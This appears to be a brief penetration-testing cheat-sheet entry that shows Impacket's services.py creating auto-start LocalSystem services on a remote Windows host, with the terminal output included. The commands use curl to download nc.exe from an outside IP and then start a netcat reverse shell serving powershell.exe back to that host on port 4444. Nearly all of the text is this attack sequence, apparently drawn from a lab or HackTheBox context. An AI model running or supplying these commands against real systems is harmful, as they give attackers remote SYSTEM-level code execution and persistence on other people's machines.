# services.py example


```
root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name upload_nc -display upload_nc -path 'curl http://10.14.14.37/nc.exe -o C:\\Windows\\Tasks\\nc.exe'
[*] Creating service upload_nc

root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 config -name upload_nc
[*] Querying service config for upload_nc
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : curl http://10.14.14.37/nc.exe -o C:\\Windows\\Tasks\\nc.exe
LOAD_ORDER_GROUP  :
TAG               : 0
DISPLAY_NAME      : upload_nc
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem

root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name upload_nc
[*] Starting service upload_nc
[-] SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.

root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 create -name run_nc -display run_nc -path 'C:\\Windows\\Tasks\\nc.exe -e powershell.exe 10.14.14.37 4444'
[*] Creating service run_nc

root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 config -name run_nc
[*] Querying service config for run_nc
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\\Windows\\Tasks\\nc.exe -e powershell.exe 10.14.14.37 4444
LOAD_ORDER_GROUP  :
TAG               : 0
DISPLAY_NAME      : run_nc
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem

root@kali:$ proxychains4 -q services.py -dc-ip 192.168.3.203 -k -no-pass 192.168.3.201 start -name run_nc
[*] Starting service run_nc
[-] SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
```

# Reference
+ https://wadcoms.github.io/wadcoms/Impacket-Services/
+ https://www.hackingarticles.in/impacket-guide-smb-msrpc/
+ https://snovvcrash.rocks/2020/12/28/htb-hades.html